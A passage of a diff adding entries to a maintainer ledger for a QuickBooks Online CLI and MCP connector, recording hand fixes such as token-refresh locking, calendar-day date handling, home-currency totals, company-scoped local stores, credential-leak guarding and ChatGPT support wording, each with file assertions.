+          "contains": "func TestAuthRefreshIgnoresUnresolvedBundlePlaceholders(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh_test.go",
+          "contains": "func TestRefreshTokenErrorShowsOnlyOAuthErrorCode(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "cliutil.EnvOverride(",
+          "min_count": 3,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-calendar-days",
+      "class": "hand-file",
+      "summary": "QuickBooks dates are calendar days in the caller's zone: one helper set (dateOf, todayOf, daysFrom) drives days past due, bills due, cash forecast, DSO, payment links and SumByRef; report balance-sheet defaults to the local date",
+      "why": "Parsing a QuickBooks date as UTC midnight and comparing to time.Now shifted every aging bucket by a day west of UTC near midnight, so an invoice could read overdue (or not) on the wrong day.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/analytics/analytics.go",
+          "contains": "func dateOf(s string) (time.Time, bool) {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/analytics.go",
+          "contains": "func todayOf(now time.Time) time.Time {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/analytics.go",
+          "contains": "func daysFrom(a, b time.Time) int {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/calendar_currency_test.go",
+          "contains": "func TestQBODatesAreCalendarDaysInCallerZone(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report_test.go",
+          "contains": "func TestReportBalanceSheetDefaultAsOfIsLocalDate(",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-home-currency",
+      "class": "hand-file",
+      "summary": "every transaction-money aggregate sums the home-currency amount (HomeAmount: the home field, else amount times ExchangeRate, else as written); is-it-open uses the written amount (Money.Open); name-list balances are never summed across currencies",
+      "why": "A multi-currency book mixed currencies in AR/AP totals, DSO and cash forecast, an answer an MSP would bill or chase on. Tests TestMoneyAggregatesUseHomeCurrency, TestNameListBalancesNeverSumAcrossCurrencies and TestOpenRecordsAreDecidedOnTheWrittenAmount pin it.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/analytics/analytics.go",
+          "contains": "func HomeAmount(obj map[string]any, field string) Money {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/analytics.go",
+          "contains": "func (m Money) Open() bool { return m.Written > 0 }",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/calendar_currency_test.go",
+          "contains": "func TestMoneyAggregatesUseHomeCurrency(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/calendar_currency_test.go",
+          "contains": "func TestNameListBalancesNeverSumAcrossCurrencies(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/calendar_currency_test.go",
+          "contains": "func TestOpenRecordsAreDecidedOnTheWrittenAmount(",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-novel-bills-due",
+      "class": "novel-feature",
+      "summary": "bills due: open bills due within --days (default 7, negative refused) plus every overdue bill, earliest first, with per-vendor totals; undated bills listed under undated",
+      "why": "A novel command registered by the generated bills.go; a reprint that loses the hand file or its registration drops a shipped feature silently.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/bills.go",
+          "contains": "addNovelCommandIfAbsent(cmd, newNovelBillsDueCmd(flags))",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/bills_due.go",
+          "contains": "func newNovelBillsDueCmd(flags *rootFlags) *cobra.Command {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/insights.go",
+          "contains": "func BillsDue(bills []map[string]any, windowDays int, now time.Time) BillsDueReport {",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-novel-invoices-unsent",
+      "class": "novel-feature",
+      "summary": "invoices unsent: open invoices with EmailStatus not EmailSent and PrintStatus not PrintComplete, largest first; an invoice with no EmailStatus is counted in status_unreported, not listed",
+      "why": "A novel command registered by the generated invoices.go; a reprint that loses the hand file or its registration drops a shipped feature silently.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/invoices.go",
+          "contains": "addNovelCommandIfAbsent(cmd, newNovelInvoicesUnsentCmd(flags))",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/invoices_unsent.go",
+          "contains": "func newNovelInvoicesUnsentCmd(flags *rootFlags) *cobra.Command {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/analytics/insights.go",
+          "contains": "func UnsentInvoices(invoices []map[string]any) UnsentInvoicesReport {",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-query-run-is-read",
+      "class": "generated-edit",
+      "summary": "query.run (GET /query) is a read in the MCP executor: NeedsConfirm and Mutating are false, and the context tool no longer marks the query resource writable",
+      "why": "Press 4.34.0 classes a GET whose name is an action verb (run) as a write. Every QuickBooks Online list is also GET /query, and the executor gates any request whose method and path match a gated endpoint, so quickbooks_read refused every list (\"resolved GET /query changes state\") and the MCP server could read nothing from QuickBooks. Intuit's /query endpoint accepts only SELECT statements, so the endpoint is a read. Seen failing first: TestQBOQueryEndpointsAreReads (internal/mcp/qbo_query_read_test.go) and verify-msp-skills feature 2.",
+      "status": "active",
+      "spec_encode_followup": "Add `mutation: false` under resources.query.endpoints.run in ~/printing-press/library/quickbooks/spec.yaml; a press 4.34.0 render with it emits exactly these two hunks (plus the mcp:read-only annotation on the CLI query run command).",
+      "asserts": [
+        {
+          "file": "cli/internal/mcp/qbo_query_read_test.go",
+          "contains": "func TestQBOQueryEndpointsAreReads(t *testing.T) {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/code_orch.go",
+          "not_contains": "NeedsConfirm:   true,\n\t\tMutating:       true,\n\t\tkeywords:       codeOrchKeywords(\"query\", \"run\""
+        }
+      ]
+    },
+    {
+      "id": "qbo-store-scope-company",
+      "class": "generated-edit",
+      "summary": "the default local store is scoped by the QuickBooks company (Intuit host plus realm from the base URL) and never by the access token; with no company known it stays the unclaimed data.db every released version used, for the CLI and the MCP server Only a base URL that names a company (a /v3/company/<realm> segment) names or claims a store; any other uses the unclaimed data.db.",
+      "why": "Press 4.34.0 names the default store data-<hash of the credential>.db. Intuit access tokens expire after an hour and each refresh returns a new one, so after a refresh every offline command (ar-aging, reconcile, customers top, MCP sql and search) read a new, empty store and exited 0 with zeros or clean:true. A token fallback for a run that does not know the company also claimed the released data.db for that token, so the next configured run read an empty store. configureDefaultDBScope now passes config.StoreScopeCompany(cfg). Found by the publish adversarial review and Codex round 2; TestQBOLocalStoreFollowsTheCompanyNotTheToken and TestQBOUpgradeKeepsTheReleasedStoreWhenTheFirstRunHasNoRealm were each seen failing first; the generated TestMCPDBPathUsesCredentialScopedStore now sets a company base URL.",
+      "status": "active",
+      "spec_encode_followup": "Press-side: a spec hint naming the stable account identity (here the base URL's company path) so a print with rotating OAuth tokens never scopes its store by token.",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/helpers.go",
+          "contains": "setDefaultDBScopeIdentity(config.StoreScopeCompany(cfg), cfg.StoreScopeLegacyCredential(), cfg.BaseURL)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/helpers.go",
+          "not_contains": "setDefaultDBScopeIdentity(cfg.StoreScopeCredential(), cfg.StoreScopeLegacyCredential(), cfg.BaseURL)"
+        },
+        {
+          "file": "cli/internal/config/qbo_store_scope.go",
+          "contains": "func StoreScopeCompany(c *Config) string {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_store_scope.go",
+          "contains": "return \"qbo_company=\" + strings.ToLower(u.Scheme) + \"://\" + strings.ToLower(u.Host) + strings.TrimRight(u.EscapedPath(), \"/\")",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/qbo_store_scope_test.go",
+          "contains": "func TestQBOLocalStoreFollowsTheCompanyNotTheToken(t *testing.T) {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/qbo_store_scope_test.go",
+          "contains": "func TestQBOUpgradeKeepsTheReleasedStoreWhenTheFirstRunHasNoRealm(t *testing.T) {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/tools_test.go",
+          "contains": "t.Setenv(\"QUICKBOOKS_BASE_URL\", \"https://quickbooks.api.intuit.com/v3/company/1001\")",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_store_scope.go",
+          "contains": "|| !qboNamesARealm(u.EscapedPath())",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/qbo_store_scope_test.go",
+          "contains": "func TestQBOOnlyABaseURLThatNamesACompanyClaimsTheReleasedStore(t *testing.T) {",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-token-refresh",
+      "summary": "automatic token refresh (#492): an access token that is missing or expires within 60 seconds is refreshed before a request, and one 401 refreshes once and retries once; each refresh runs inside one cross-process lock around re-read, check, grant and save, so concurrent CLI and MCP processes make one token call; the rotated refresh token, access token and expiry are saved durably before any retry",
+      "why": "QuickBooks access tokens expire after about an hour and refresh tokens rotate, but nothing on the request path read token_expiry or handled a 401, so every command failed an hour after `auth refresh` (issue #492). The press generates request-path refresh only for an OAuth2 spec with a token URL; the QuickBooks spec declares bearer_token, so client.go carried empty lockTokenState/unlockTokenState stubs. The fix: lockTokenState is a real per-client mutex (likelyCredentialed now reads the header through it too); doInternal calls qboRefreshBeforeRequest before resolving the header and qboRefreshAfterUnauthorized on the first 401 (one retry; a second 401 is returned; a refresh whose new tokens cannot be saved fails the request instead of going ahead). client.QBORefreshTokens takes cliutil.QBOWithTokenLock (the filelock.go primitives, with the lock file opened O_NOFOLLOW and refused unless regular), re-reads the configuration with the same --config argument (config.QBOReload via qboLoadArg), adopts a fresh token another process saved, else calls the grant (the one in auth_refresh.go, installed as client.QBOTokenGrant, so its suppressions and guards stay where they are), trying the stored refresh token first and QUICKBOOKS_REFRESH_TOKEN after an invalid_grant, and saves only the tokens (a client secret set only in the environment is not copied to disk) with config.QBOSaveRefreshedTokens: credentials file first via cliutil.DurableAtomicWritePrivateFile (O_EXCL temp in the same dir, 0600, fsync, rename, dir sync), never restoring the earlier file (it may hold a refresh token Intuit retired), and rewriting the config file only when it still carries credential fields. SaveCredentials and config save() use the durable write; the chokepoint gate test lists the two new writers. Tests seen failing first on the earlier code or on a mutant: the cmd/quickbooks-mcp e2e set (.review/seen/qb492-refresh-e2e-fail-first.txt), TestQBOTwoProcessesRefreshOnce and TestQBOConcurrentRequestsRefreshOnce (no-lock and no-reread mutants, .review/seen/qb492-lock-mutants.txt), and the durable-write, symlink-lock and no-restore tests (.review/seen/qb492-store-mutants.txt). TestTokenReadersTakeTheTokenLock (an unlocked-read mutant, under -race) and the environment-secret assertion were seen failing first (.review/seen/qb492-race-and-secret-mutants.txt). A refresh token rejected with invalid_grant is remembered (by digest) for the life of the process and not sent again, so a long sync or the MCP server does not call the token endpoint on every request with a dead token; TestQBORejectedRefreshTokenIsNotResentInTheSameProcess failed on a mutant that forgets it (.review/seen/qb492-rejected-memo-mutant.txt). Codex round 1 (two P1 classes, two P2): (1) a refused token answer's values are held too (cliutil.QBOHoldTokenErrorAnswer, every value but the RFC 6749 error code), so a token named in a 400 body cannot reach output through a later answer that repeats it; (2) the refresh saves to and locks the credentials file Load actually read (config.qboCredentialsFile, recorded in applyStoredCredentials; with none, a --config profile's own data/credentials.toml, else the global file) through cliutil.QBOSaveCredentialsTo, so a profile's next run reads the rotated pair and the global store is untouched; a failed directory flush after the rename is reported; on Windows the lock file is opened with FILE_FLAG_OPEN_REPARSE_POINT and a reparse point is refused. TestQBOTokensInARefusedGrantAreHeld, TestQBOProfileRefreshSavesToTheProfileStore and TestDurableWriteReportsAFailedDirectoryFlush were seen failing first (.review/seen/qb492-codex-r1-fail-first.txt). Codex round 2 (two P1, the first repeating the round-1 class): (1) a refused answer is now held at any depth and under any key, the error member and duplicate keys included, except a string exactly equal to an RFC 6749 code; (2) SaveTokens and ClearTokens (auth set-token, auth login, auth logout) take the same refresh lock as the refresh, so their snapshot-write-restore cannot roll a rotated pair back. Both tests seen failing first (.review/seen/qb492-codex-r2-fail-first.txt). Open (Codex round-2 P2, not fixed): a crash between the credentials-file write and the config rewrite, when config.toml still carries legacy credentials, leaves those older credentials shadowing the new file on restart.",
+      "status": "active",
+      "spec_encode_followup": "Spec change recorded in the local press library spec (auth.type oauth2, oauth2_grant authorization_code, Intuit token_url): a reprint then generates request-path refresh and the 401 retry by construction. The press template still has no cross-process lock, no durable no-restore save and posts client credentials in the form body, so the lock, the save and the grant guards stay hand-fixes after such a reprint.",
+      "asserts": [
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "tokenMu sync.Mutex",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "c.tokenMu.Lock()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "not_contains": "func (c *Client) lockTokenState() {}"
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "preRefreshErr := c.qboRefreshBeforeRequest(ctx)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "if resp.StatusCode == http.StatusUnauthorized && !refreshedAfterUnauthorized {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "fresh, retry, refreshErr := c.qboRefreshAfterUnauthorized(ctx, authHeader, preRefreshErr)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "const qboRefreshWindow = 60 * time.Second",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "time.Until(cfg.TokenExpiry) < qboRefreshWindow",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "err = cliutil.QBOWithTokenLock(lockPath, func() error {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "fresh, err := cfg.QBOReload()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "fresh.QBOSaveRefreshedTokens(access, rotated, expiry)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "errors.Is(err, ErrRefreshTokenRejected)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "cfg.qboLoadArg = configPath",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "cliutil.DurableAtomicWritePrivateFile(c.Path, data, 0o600, 0o700)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "return Load(c.qboLoadArg)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "not_contains": "restoreCredentialsFile("
+        },
+        {
+          "file": "cli/internal/cliutil/credentials.go",
+          "contains": "DurableAtomicWritePrivateFile(path, data, 0o600, 0o700)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_durable_write.go",
+          "contains": "if err := qboSyncFile(tmp); err != nil {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "func init() { client.QBOTokenGrant = qboTokenGrant }",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "client.QBORefreshTokens(cmd.Context(), cfg, \"\", true)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "return target == client.ErrRefreshTokenRejected && e.code == \"invalid_grant\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_token_refresh_e2e_test.go",
+          "contains": "func TestQBORefreshesBeforeAnExpiringToken(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_token_refresh_e2e_test.go",
+          "contains": "func TestQBOSecond401IsReturnedWithoutLooping(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_token_refresh_e2e_test.go",
+          "contains": "func TestQBOTokenEndpointErrorBodyReachesNoOutput(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh_ext_test.go",
+          "contains": "func TestQBOTwoProcessesRefreshOnce(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_durable_write_test.go",
+          "contains": "func TestTokenLockRefusesASymlink(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store_test.go",
+          "contains": "func TestQBOSaveRefreshedTokensKeepsTheRotatedTokenWhenTheConfigWriteFails(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "if strings.TrimSpace(c.cachedAuthHeader()) != \"\" {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh_test.go",
+          "contains": "func TestTokenReadersTakeTheTokenLock(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_token_refresh_e2e_test.go",
+          "contains": "func TestQBOEnvironmentOnlyCredentialsRefreshOnceAcrossRuns(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "qboRejectedRefreshTokens.Store(qboRefreshTokenDigest(rt), struct{}{})",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh_ext_test.go",
+          "contains": "func TestQBORejectedRefreshTokenIsNotResentInTheSameProcess(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_token_lock.go",
+          "contains": "f, err := qboOpenLockFile(lockPath)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_lock_open_unix.go",
+          "contains": "os.O_CREATE|os.O_RDWR|syscall.O_NOFOLLOW",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_lock_open_windows.go",
+          "contains": "windows.FILE_FLAG_OPEN_REPARSE_POINT",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_lock_open_windows.go",
+          "contains": "info.FileAttributes&(windows.FILE_ATTRIBUTE_REPARSE_POINT|windows.FILE_ATTRIBUTE_DIRECTORY) != 0",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_durable_write.go",
+          "contains": "if err := qboSyncDirectory(dir); err != nil {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credkit_hold.go",
+          "contains": "func QBOHoldTokenErrorAnswer(data []byte, publicCodes map[string]bool) {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "cliutil.QBOHoldTokenErrorAnswer(body, oauthTokenErrorCodes)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "c.qboCredentialsFile = status.Path",
+          "min_count": 2,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "if err := cliutil.QBOSaveCredentialsTo(storePath, creds); err != nil {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "p, err := c.qboTokenStorePath()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credentials_store.go",
+          "contains": "func QBOSaveCredentialsTo(path string, creds *Credentials) error {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_token_refresh_e2e_test.go",
+          "contains": "func TestQBOTokensInARefusedGrantAreHeld(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_token_refresh_e2e_test.go",
+          "contains": "func TestQBOProfileRefreshSavesToTheProfileStore(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_durable_write_test.go",
+          "contains": "func TestDurableWriteReportsAFailedDirectoryFlush(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credkit_hold.go",
+          "contains": "if !qboNotCredentialJSONKeys[key] && !publicValues[value] {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "return c.qboWithWriterLock(func() error {",
+          "min_count": 2,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "return cliutil.QBOWithTokenLock(lockPath, fn)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store_test.go",
+          "contains": "func TestQBOCredentialWritersWaitForARefresh(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/credentials.go",
+          "contains": "`toml:\"supersedes_config,omitempty\"`",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "c.qboStoreSupersedesConfig(explicit, configPath)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "creds.SupersedesConfig = qboConfigDigest(c.qboConfigSourcePath())",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/qbo_token_refresh.go",
+          "contains": "grantCtx := context.WithValue(ctx, qboTokenTransportKey{}, tokenClient.Transport)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "cliutil.OutboundGuard(client.QBOTokenTransport(ctx))",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credentials_store.go",
+          "contains": "func QBOStoredSupersedes(configPath string, explicit bool) string {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "credsPath, err := c.qboTokenStorePath()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "cliutil.QBOSaveCredentialsTo(credsPath, persisted.credentials())",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "cliutil.QBORemoveCredentialsFile(storePath)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "lockPath, err := c.QBOTokenLockPath()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credentials_store.go",
+          "contains": "rec, values := qboDecodeStoreRecord(data)",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "chatgpt-desktop-local-web-unsupported",
+      "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
+      "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
+      "status": "active",
+      "spec_encode_followup": "Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.",
+      "asserts": [
+        {
+          "file": "mcp-install.md",
+          "contains": "## ChatGPT desktop app (OpenAI)",
+          "min_count": 1
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "**Not supported by msp-skills yet.** ChatGPT on the web",
+          "min_count": 1
+        },
+        {
+          "file": "mcp-install.md",
+          "not_contains": "## ChatGPT (Developer Mode)"
+        },
+        {
+          "file": "mcp-install.md",
+          "not_contains": "*Remote* agents (ChatGPT"
+        },
+        {
+          "file": "README.md",
+          "contains": "### Does this work with ChatGPT?\n\nYes, in the **ChatGPT desktop app**.",
+          "min_count": 1
+        },
+        {
+          "file": "README.md",
+          "not_contains": "Plus/Pro+"
+        },
+        {
+          "file": "README.md",
+          "not_contains": "Developer Mode"
+        },
+        {
+          "file": "README.md",
+          "not_contains": "Microsoft 365 Copilot, Gemini, and any agent"
+        },
+        {
+          "file": "page.json",
+          "contains": "\"a\": \"Yes, in the ChatGPT desktop app.",
+          "min_count": 1
+        },
+        {
+          "file": "page.json",
+          "not_contains": "connects only to remote"
+        }
+      ]
+    },
+    {
+      "id": "credkit-wiring",
+      "class": "credential-kit",
+      "status": "active",
+      "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand: internal/credwire/declarations.go holds the one credkit.Declarations literal (SecretEnv QUICKBOOKS_ACCESS_TOKEN, _CLIENT_ID, _CLIENT_SECRET, _REFRESH_TOKEN and _MCP_HTTP_TOKEN; Files = every config and credentials file a run may read, from config.ReadPaths and each --config and --home; ConfigFields auth_header, access_token, refresh_token, client_id, client_secret; BaseURL base_url / QUICKBOOKS_BASE_URL / https://quickbooks.api.intuit.com; an access token bound to the base URL and the QuickBooks API hosts, the OAuth client and the refresh token to the base URL and Intuit's token endpoint, the MCP bearer and the TLS key to none). internal/credsql registers the one credkit-sqlite driver, with the MCP sql tool's value cap set as each connection opens. credkit.Start is the first statement of both mains, and credkit.Exit ends them. credwire's Files holds, inside credkit.Start, the credentials in QUICKBOOKS_TOKEN_URL and QUICKBOOKS_FEEDBACK_ENDPOINT (cliutil.QBOHoldEnvInputs) and a saved profile's values under a credential flag or base-url (cliutil.QBOHoldProfileStore). Free text is not read: the leak contract's section 1 is a closed list. Every sink is routed: stdout and stderr at the descriptor, the API client's cliutil.OutboundGuard, deliver, feedback, the token grant and the auth probe through credkit.Transport, cache, journal, teach log, profile and export files through credkit.WriteFile, AppendFile and OpenFile, the MCP server through MCPTools, MCPIn, MCPOut and MCPHTTP, child processes through RunCommand. The connector's own 0600 credential store and config file are credential sources: their writes stay outside the kit (DurableAtomicWritePrivateFile, cliutil.AtomicWriteCredentialFile). A webhook or feedback URL is its own key and cannot be held (delivery has to send it), so a run profile refuses a webhook value, profile show and use print a stored one as webhook:<saved, not shown>, and no error or message names one.",
+      "why": "Retires secret-echo-decoded-funnel, qbo-oauth-env-secrets-held, qbo-client-success-answers-funnelled, qbo-mcp-success-results-funnelled and qbo-held-credentials-one-chokepoint, replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements fleet_handfixes.json backs). That filter kept growing per review round because each sink and encoding was closed one at a time. The kit is one shared implementation of the leak contract, checked byte for byte against tools/maintainer/credkit (vendor_credkit.py --check). A match withholds the whole unit, and a credentialed request over plain http or to another origin is refused. Local files the connector writes that carry no credential by construction (lock files, the fingerprint key, the SQLite journal stub) are not routed.",
+      "spec_encode_followup": "Press-side: the press should vendor the kit and generate the Start and Exit lines and the sink routing, so a reprint keeps them.",
+      "asserts": [
+        {
+          "file": "cli/internal/credwire/declarations.go",
+          "contains": "var Declarations = credkit.Declarations{",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-cli/main.go",
+          "contains": "credkit.Start(credwire.Declarations)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-cli/main.go",
+          "contains": "credwire.RestoreBaseURLEnv()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-cli/main.go",
+          "not_contains": "os.Exit("
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/main.go",
+          "contains": "credkit.Start(credwire.Declarations)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/main.go",
+          "contains": "credwire.RestoreBaseURLEnv()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/main.go",
